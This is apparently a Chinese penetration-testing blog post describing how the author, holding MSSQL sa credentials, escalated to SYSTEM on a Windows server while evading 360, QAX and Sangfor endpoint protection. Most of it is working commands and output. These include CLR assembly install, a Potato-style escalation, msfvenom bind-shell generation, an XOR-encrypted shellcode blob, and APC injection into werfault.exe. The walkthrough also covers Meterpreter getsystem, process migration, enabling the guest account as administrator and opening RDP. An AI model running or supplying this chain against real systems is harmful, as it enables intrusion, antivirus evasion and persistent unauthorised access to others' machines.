---
layout: post
title: MSSQL CLR Bypass AV/EDR & LEP
category: 渗透测试
tags: [mssql, clr, bypass, antivirus]
---

## 前言

在最近的一次攻防中，一个内网环境成功把我整麻了，把我这辈子听过的国产终端防护产品都见了个遍，从 360 安全卫士、QAX 天擎、到火绒、腾讯电脑管家，甚至连瑞星杀毒都见到了 😭。

以下是我在利用 MSSQL CLR 进行本地提权（Local Privilege Escalation, LEP），并绕过终端防护的经历。

## CLR 介绍

Beginning with SQL Server 2005 (9.x), SQL Server features the integration of the common language runtime (CLR) component of the .NET Framework for Microsoft Windows.

For SQL Server users and application developers, CLR integration means that you can now write stored procedures, triggers, user-defined types, user-defined functions (scalar and table valued), and user-defined aggregate functions using any .NET Framework language, including Microsoft Visual Basic .NET and Microsoft Visual C#.

## 环境概述

SA 权限的 MSSQL 数据库，且知晓明文密码：

```console
root@kali-server:~# proxychains4 -q nxc mssql 192.168.8.48 -u sa -p 'password' --local-auth -M mssql_priv
MSSQL       192.168.8.48    1433   WIN-TARGET  [*] Windows 8.1 / Server 2012 R2 Build 9600 (name:WIN-TARGET) (domain:WIN-TARGET)
MSSQL       192.168.8.48    1433   WIN-TARGET  [+] WIN-TARGET\sa:password (Pwn3d!)
MSSQL_PRIV                                     [+] sa is already a sysadmin
```

> 注：省略了开启 xp_cmdshell 步骤，推荐使用 impacket-mssqlclient。

在开启 xp_cmdshell 后，执行大部分命令会没有回显，会被终端防护产品拦截：

```console
root@kali-server:~# proxychains4 -q nxc mssql 192.168.8.48 -u sa -p 'password' --local-auth -x 'whoami /priv' --mssql-timeout 30
MSSQL       192.168.8.48    1433   WIN-TARGET  [*] Windows 8.1 / Server 2012 R2 Build 9600 (name:WIN-TARGET) (domain:WIN-TARGET)
MSSQL       192.168.8.48    1433   WIN-TARGET  [+] WIN-TARGET\sa:password (Pwn3d!)
MSSQL       192.168.8.48    1433   WIN-TARGET  [+] Executed command via mssqlexec
MSSQL       192.168.8.48    1433   WIN-TARGET  特权信息
MSSQL       192.168.8.48    1433   WIN-TARGET  ----------------------
MSSQL       192.168.8.48    1433   WIN-TARGET  特权名                        描述                 状态
MSSQL       192.168.8.48    1433   WIN-TARGET  ============================= ==================== ======
MSSQL       192.168.8.48    1433   WIN-TARGET  SeAssignPrimaryTokenPrivilege 替换一个进程级令牌   已禁用
MSSQL       192.168.8.48    1433   WIN-TARGET  SeIncreaseQuotaPrivilege      为进程调整内存配额   已禁用
MSSQL       192.168.8.48    1433   WIN-TARGET  SeChangeNotifyPrivilege       绕过遍历检查         已启用
MSSQL       192.168.8.48    1433   WIN-TARGET  SeImpersonatePrivilege        身份验证后模拟客户端 已启用
MSSQL       192.168.8.48    1433   WIN-TARGET  SeCreateGlobalPrivilege       创建全局对象         已启用
MSSQL       192.168.8.48    1433   WIN-TARGET  SeIncreaseWorkingSetPrivilege 增加进程工作集       已禁用
```

可以利用 CLR 结合 Potato 提权到 SYSTEM 但依旧会触发终端防护。

如下，已经成功使用 DIR 命令列出 Administrator 用户桌面上的文件，但无法查看文件内容：

```console
PS C:\> SharpSQLTools.exe 192.168.8.48 sa "password" master install_clr
[*] Database connection is successful!
[+] ALTER DATABASE master SET TRUSTWORTHY ON
[+] Import the assembly
[+] Link the assembly to a stored procedure
[+] Install clr successful!

PS C:\> SharpSQLTools.exe 192.168.8.48 sa "password" master enable_clr
[*] Database connection is successful!
配置选项 'show advanced options' 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。
配置选项 'clr enabled' 已从 0 更改为 1。请运行 RECONFIGURE 语句进行安装。

PS C:\> SharpSQLTools.exe 192.168.32.253 sa "password" master clr_badpotato 'dir C:\Users\Administrator\Desktop'
[*] Database connection is successful!
[*] CreateNamedPipeW Success! IntPtr:9160
[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:35870128
[*] ConnectNamePipe Success!
[*] CurrentUserName : SYSTEM
[*] CurrentConnectPipeUserName : SYSTEM
[*] ImpersonateNamedPipeClient Success!
[*] OpenThreadToken Success! IntPtr:9056
[*] DuplicateTokenEx Success! IntPtr:8976
[*] SetThreadToken Success!
[*] CreateOutReadPipe Success! out_read:9108 out_write:8896
[*] CreateErrReadPipe Success! err_read:8396 err_write:8264
[*] CreateProcessWithTokenW Success! ProcessPid:17208
 驱动器 C 中的卷没有标签。

 卷的序列号是 C679-3C82

 C:\Users\Administrator\Desktop 的目录

2024/05/17  17:09    <DIR>          .
2024/05/17  17:09    <DIR>          ..
2024/05/17  09:14    <DIR>          LocaleMetaData
2018/10/31  14:44             1,158 services.lnk
2018/10/31  14:13             1,086 SQL Server Management Studio.lnk
2019/04/09  15:30               733 VNC Viewer.lnk
2023/08/20  16:12                35 VPNSTOP.bat
2023/08/20  16:12                31 VPNSTOP2.bat
2021/11/17  08:50       628,791,073 互联网奇安信天擎.exe

              14 个文件    659,537,152 字节

               4 个目录 366,398,402,560 可用字节

PS C:\> SharpSQLTools.exe 192.168.32.253 sa "password" master clr_badpotato 'type C:\Users\Administrator\Desktop\VPNSTOP.bat'
[*] Database connection is successful!
[*] CreateNamedPipeW Success! IntPtr:8964
[*] RpcRemoteFindFirstPrinterChangeNotificationEx Success! IntPtr:35873584
[*] ConnectNamePipe Success!
[*] CurrentUserName : MSSQLSERVER
[*] CurrentConnectPipeUserName : SYSTEM
[*] ImpersonateNamedPipeClient Success!
[*] OpenThreadToken Success! IntPtr:8928
[*] DuplicateTokenEx Success! IntPtr:9104
[*] SetThreadToken Success!
[*] CreateOutReadPipe Success! out_read:8752 out_write:8936
[*] CreateErrReadPipe Success! err_read:9172 err_write:9168
拒绝访问。
```

## 操作步骤

生成 Shellcode：

```console
root@kali-server:~# msfvenom -p windows/x64/meterpreter/bind_tcp lport=54216 -f raw -o bindshell.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 499 bytes
Saved as: bindshell.bin
```

使用 SharpSQLTools 项目中自带的脚本加密 Shellcode：

```console
PS C:\> python3 ./Python/Encrypt.py -f bindshell.bin -k loader
XorKey: loader
Result: kCfggJWNk5CJqGVybC4wJTUgJF6zAS35Pg8p7zdqJOQzRDQkIV6oLGrFJiUp7xciJF6hyFkTEG1NRCSzpWIgZaSQgT0p7zdSLT7qJlk6bb8H5R1qZ21u4RdybG/q5O1ybG8p4aUGCydgtDX5JHcl7yVSJW6xhzM6k6Yg71H6IV6oLGSkJF6hyCSzpWIgZaRKjBqQKGY+SGckXbQHtDcl7yVWJW6xAiT5YCcl7yVuJW6xJe525C45JT0sJG6xPT8zNC44JT8674NBJTeNjDcgPT86532IL5qNkzIo2hIBXjBSVmVyLTko7YM67YPBZWVyJeaELFSyPD8o2Gdyv6dhZGVyLTso7YE+5Z4g3ikFSmiesSn7hgdgZWVyNS7bTeUZbJC0DmcrPD8sVaw/Xa8pm6U65a0g3o99s4+esS37qwVxJT0+5Y0p7Zwz1q26UwKNuSdQti37lS7b04xKk5C0KVSyJF6zLOyLLdUViF6Tk7op7Zw65agg3hAcIQ6esS3zqN9jZGU674NxLOyQIV6oDmEzNCfonSTIbrapO5qnJOylRDv7mgUhJTwabH9hZCQqJOaTLFS7LdU5wDaXk7op7aY75agsVaw75Z8p7b865ZYg3merpDCesS1zrydIoi33mhqAJZqVNAVhPSy1rp/UxjONuQ==
```

使用 SharpSQLTools 工具进行操作，将加密后 Shellcode 上传至目标主机并解密加载进内存中：

```console
PS C:\> SharpSQLTools.exe 192.168.32.253 sa "password"  master upload .\p.txt C:\\Users\\public\\p.txt
[*] Database connection is successful!
[*] Uploading '.\p.txt' to 'C:\\Users\\public\\p.txt'...
[+] C:\\Users\\public\\p.txt_1.config_txt Upload completed
[+] copy /b C:\\Users\\public\\p.txt_x.config_txt C:\\Users\\public\\p.txt
[+] del C:\\Users\\public\\*.config_txt
[*] '.\p.txt' Upload completed

PS C:\> SharpSQLTools.exe 192.168.32.253 sa "password"  master clr_combine C:\\Users\\public\\p.txt
[*] Database connection is successful!
[+] remoteFile: C:\\Users\\public\\p.txt
[+] count: 1
[+] combinefile: C:\\Users\\public\\p.txt_*.config_txt C:\\Users\\public\\p.txt
[*] 'C:\\Users\\public\\p.txt_*.config_txt' CombineFile completed

PS C:\> SharpSQLTools.exe 192.168.32.253 sa "password"  master clr_scloader1 C:\\Users\\public\\p.txt loader
[*] Database connection is successful!
[+] EncryptShellcodePath: C:\\Users\\public\\p.txt
[+] XorKey: loader
[+] StartProcess werfault.exe
[+] OpenProcess Pid: 21648
[+] VirtualAllocEx Success
[+] QueueUserAPC Inject shellcode to PID: 21648 Success
[+] hOpenProcessClose Success


[*] QueueUserAPC Inject shellcode Success, enjoy!
```

MSF 接收 Shell：

```console
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
payload => windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set rhost 192.168.32.253
rhost => 192.168.32.253
msf6 exploit(multi/handler) > set lport 54216
lport => 54216
msf6 exploit(multi/handler) > run

[*] Started bind TCP handler against 192.168.32.253:54216
[*] Sending stage (201798 bytes) to 192.168.32.253
[*] Meterpreter session 1 opened (172.28.147.26:47770 -> socks5_server:port) at 2024-05-18 06:40:18 -0700

meterpreter >
```

目前获得的是一个低权限 MSSQL 账户：

```console
meterpreter > getuid
Server username: NT Service\MSSQLSERVER

meterpreter > getpid
Current pid: 21648

meterpreter > load powershell
Loading extension powershell...Success.
meterpreter > powershell_execute whoami
[+] Command execution completed:
nt service\mssqlserver
```

此时，在 MSF 中可以直接使用 getsystem 获取到 SYSTEM 权限：

> 注：此时会存在一个小问题，虽然已经有了 SYSTEM 权限，但在 powershell 模块执行命令时还是 mssqlserver 权限。进程迁移后可解决该问题。

```console
meterpreter > getsystem
...got system via technique 5 (Named Pipe Impersonation (PrintSpooler variant)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > powershell_execute whoami
[+] Command execution completed:
nt service\mssqlserver

meterpreter > ps

Process List
============

 PID    PPID   Name                 Arch  Session  User                              Path
 ---    ----   ----                 ----  -------  ----                              ----
 0      0      [System Process]
 4      0      System               x64   0
 276    956    services.exe         x64   0
 292    956    lsass.exe            x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\lsass.exe
 700    276    svchost.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\svchost.exe
 764    4      smss.exe             x64   0
 840    1244   QAXEntClient.exe     x86   1        WIN-TARGET\Administrator          C:\Program Files (x86)\QAX\360safe\QAXEntClient.exe
 852    984    dwm.exe              x64   1        Window Manager\DWM-1              C:\Windows\system32\dwm.exe
 856    276    svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE      C:\Windows\system32\svchost.exe
 892    884    csrss.exe            x64   0
 948    940    csrss.exe            x64   1
 956    884    wininit.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\wininit.exe
 984    940    winlogon.exe         x64   1        NT AUTHORITY\SYSTEM               C:\Windows\system32\winlogon.exe
 1044   276    svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE        C:\Windows\System32\svchost.exe
 1068   276    svchost.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\svchost.exe
 1140   276    svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE        C:\Windows\system32\svchost.exe
 1244   276    QAXEntClient.exe     x86   0        NT AUTHORITY\SYSTEM               C:\Program Files (x86)\QAX\360safe\QAXEntClient.exe
 1344   276    svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE      C:\Windows\system32\svchost.exe
 1504   276    svchost.exe          x64   0        NT AUTHORITY\LOCAL SERVICE        C:\Windows\system32\svchost.exe
 1672   276    spoolsv.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\System32\spoolsv.exe
 1700   276    svchost.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\svchost.exe
 1724   276    MPIO_Agent.exe       x86   0        NT AUTHORITY\SYSTEM               C:\Program Files (x86)\Inspur\AS Manager Multipath\MPIO_Agent.exe
 1792   276    d_manage.exe         x86   0        NT AUTHORITY\SYSTEM               D:\d_safe_2.1.5.4\modules\d_manage.exe
 1824   276    inetinfo.exe         x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\inetsrv\inetinfo.exe
 1844   276    LogService.exe       x86   0        NT AUTHORITY\SYSTEM               C:\Program Files (x86)\QAX\360safe\logframework\LogService.exe
 1984   276    MsDtsSrvr.exe        x64   0        NT SERVICE\MsDtsServer110         D:\Program Files\Microsoft SQL Server\110\DTS\Binn\MsDtsSrvr.exe
 1996   276    ZhuDongFangYu.exe    x86   0        NT AUTHORITY\SYSTEM               C:\Program Files (x86)\QAX\360safe\deepscan\ZhuDongFangYu.exe
 2284   276    sqlservr.exe         x64   0        NT SERVICE\MSSQLSERVER            D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Binn\sqlservr.exe
 2312   276    msmdsrv.exe          x64   0        NT SERVICE\MSSQLServerOLAPServic  d:\Program Files\Microsoft SQL Server\MSAS11.MSSQLSERVER\OLAP\bin\msmdsrv.exe
 2452   276    ReportingServicesSe  x64   0        NT SERVICE\ReportServer           D:\Program Files\Microsoft SQL Serrver\MSRS11.MSSQLSERVER\ReportingServices\ReportServer\bin\ReportingServicesService.exe
 3420   276    SangforPWEx.exe      x86   0        NT AUTHORITY\SYSTEM               C:\Program Files (x86)\Sangfor\SSL\SangforPWEx\SangforPWEx.exe
 3448   276    SangforPromoteServi  x86   0        NT AUTHORITY\SYSTEM               C:\Program Files (x86)\Sangfor\SSL\Promote\SangforPromoteService.exe
 3896   276    sqlwriter.exe        x64   0        NT AUTHORITY\SYSTEM               C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe
 3920   276    svchost.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\svchost.exe
 4288   276    winvnc4.exe          x64   0        NT AUTHORITY\SYSTEM               D:\Program Files\RealVNC\VNC4\WinVNC4.exe
 4348   4288   winvnc4.exe          x64   1        NT AUTHORITY\SYSTEM               D:\Program Files\RealVNC\VNC4\winvnc4.exe
 4368   276    ZSKSysService.exe    x86   0        NT AUTHORITY\SYSTEM               E:\ZSKServer\ZSKsysservice\sysservice\ZSKSysService.exe
 4548   5416   explorer.exe         x64   1        WIN-TARGET\Administrator          C:\Windows\Explorer.EXE
 4568   276    SQLAGENT.EXE         x64   0        NT SERVICE\SQLSERVERAGENT         D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE
 4608   840    QAXTray.exe          x86   1        WIN-TARGET\Administrator          C:\Program Files (x86)\QAX\360safe\safemon\QAXtray.exe
 4680   4568   conhost.exe          x64   0        NT SERVICE\SQLSERVERAGENT         C:\Windows\system32\conhost.exe
 5180   700    SogouImeBroker.exe   x86   1        WIN-TARGET\Administrator          C:\Windows\SysWOW64\IME\SogouPY\SogouImeBroker.exe
 5508   276    fdlauncher.exe       x64   0        NT SERVICE\MSSQLFDLauncher        D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Binn\fdlauncher.exe
 5600   700    WmiPrvSE.exe         x86   0        NT AUTHORITY\NETWORK SERVICE      C:\Windows\sysWOW64\wbem\wmiprvse.exe
 5688   700    WmiPrvSE.exe         x64   0        NT AUTHORITY\NETWORK SERVICE      C:\Windows\system32\wbem\wmiprvse.exe
 6268   276    svchost.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\System32\svchost.exe
 6384   276    svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE      C:\Windows\System32\svchost.exe
 6388   700    ChsIME.exe           x64   1        WIN-TARGET\Administrator          C:\Windows\System32\InputMethod\CHS\ChsIME.exe
 6632   276    svchost.exe          x64   0        NT AUTHORITY\NETWORK SERVICE      C:\Windows\system32\svchost.exe
 7048   3448   ECAgent.exe          x86   1        WIN-TARGET\Administrator          C:\Program Files (x86)\Sangfor\SSL\ECAgent\ECAgent.exe
 7060   700    rundll32.exe         x64   1        WIN-TARGET\Administrator          C:\Windows\System32\rundll32.exe
 7184   5508   fdhost.exe           x64   0        NT SERVICE\MSSQLFDLauncher        D:\Program Files\Microsoft SQL Server\MSSQL11.MSSQLSERVER\MSSQL\Binn\fdhost.exe
 7192   7184   conhost.exe          x64   0        NT SERVICE\MSSQLFDLauncher        C:\Windows\system32\conhost.exe
 7652   1068   taskhostex.exe       x64   1        WIN-TARGET\Administrator          C:\Windows\system32\taskhostex.exe
 7808   3420   SangforUDProtectEx.  x86   1        NT AUTHORITY\SYSTEM               C:\Program Files (x86)\Sangfor\SSL\SangforPWEx\SangforUDProtectEx.exe
 8972   11028  QAXleakfixer.exe     x86   1        WIN-TARGET\Administrator          C:\Program Files (x86)\QAX\360safe\QAXleakfixer.exe
 9424   4608   QAXDownMgr.exe       x86   1        WIN-TARGET\Administrator          C:\Program Files (x86)\QAX\360safe\QAXDownMgr.exe
 11028  4608   QAXSafe.exe          x86   1        WIN-TARGET\Administrator          C:\Program Files (x86)\QAX\360safe\QAXsafe.exe
 16188  276    sfemon.exe           x64   0        NT AUTHORITY\SYSTEM               c:\program files\sangfor\ues\agent\bin\sfemon.exe
 16804  17360  conhost.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\conhost.exe
 17360  16188  sfeav.exe            x64   0        NT AUTHORITY\SYSTEM               c:\program files\sangfor\ues\agent\bin\sfeav.exe
 18528  700    TiWorker.exe         x64   0        NT AUTHORITY\SYSTEM               C:\Windows\winsxs\amd64_microsoft-windows-servicingstack_31bf3856ad364e35_6.3.9600.17031_none_fa50b3979b1bcb4a\TiWorker.exe
 19120  19376  conhost.exe          x64   0        NT AUTHORITY\SYSTEM               C:\Windows\system32\conhost.exe
 19164  21648  conhost.exe          x64   0        NT SERVICE\MSSQLSERVER            C:\Windows\system32\conhost.exe
 19376  16188  sfesvc.exe           x64   0        NT AUTHORITY\SYSTEM               c:\program files\sangfor\ues\agent\bin\sfesvc.exe
 20276  276    TrustedInstaller.ex  x64   0        NT AUTHORITY\SYSTEM               C:\Windows\servicing\TrustedInstaller.exe
 20776  19376  sfcascollector.exe   x64   0        NT AUTHORITY\SYSTEM               c:\program files\sangfor\ues\agent\bin\sfcascollector.exe
 21648  2284   WerFault.exe         x64   0        NT SERVICE\MSSQLSERVER            C:\Windows\System32\werfault.exe

meterpreter >
```

虽然已经拥有了 SYSTEM 权限，但进程任然为 WerFault.exe，终端防护产品依旧会根据进程链（sqlservr.exe -> WerFault.exe -> cmd.exe）进行拦截。

需要进行进程迁移，或者注入其它进程中才能绕过针对进程链的防护。

至此，获取到的 Shell 才能执行任意命令：

```console
meterpreter > migrate 700
[*] Migrating from 21648 to 700...
[*] Migration completed successfully.

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > getpid
Current pid: 700

meterpreter > powershell_execute whoami
[+] Command execution completed:
nt authority\system

meterpreter > powershell_execute 'net user guest /active:yes'
[+] Command execution completed:
����ɹ���ɡ�

meterpreter > powershell_execute 'net localgroup administrators guest /add'
[+] Command execution completed:
����ɹ���ɡ�

meterpreter > powershell_execute 'REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'
[+] Command execution completed:
�����ɹ���ɡ�

meterpreter > back

msf6 exploit(multi/handler) > sessions

Active sessions
===============

  Id  Name  Type                     Information                            Connection
  --  ----  ----                     -----------                            ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ WIN-TARGET       172.28.147.26:47770 -> socks5_server:port (192.168.32.253)

```

原以为主机上有深信服 VPN，还开了自动登录，可以狂刷一下了，结果来了个悲伤的故事 🙃：

![alt text](https://raw.githubusercontent.com/h0ny/repo/main/images/4e1162333a35707c.png)

## 参考文章

- [MSSQL Server CheatSheet - CLR Assemblies](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/mssql-server-cheatsheet/#clr-assemblies)
- [mssql 提权之使用 clr bypass360 - AD 钙奶](https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/)
- [Mssql CLR 提权工具 - R3m1x](https://www.cmdhack.com/archives/224.html)
- [MSSQL CLR Bypass 杀软 - Macchiato](https://macchiato.ink/web/web_security/mssqlclr_bypass/)
- [Common language runtime (CLR) programming - SQL Server](https://learn.microsoft.com/en-us/sql/relational-databases/clr-integration/common-language-runtime-clr-integration-programming-concepts)
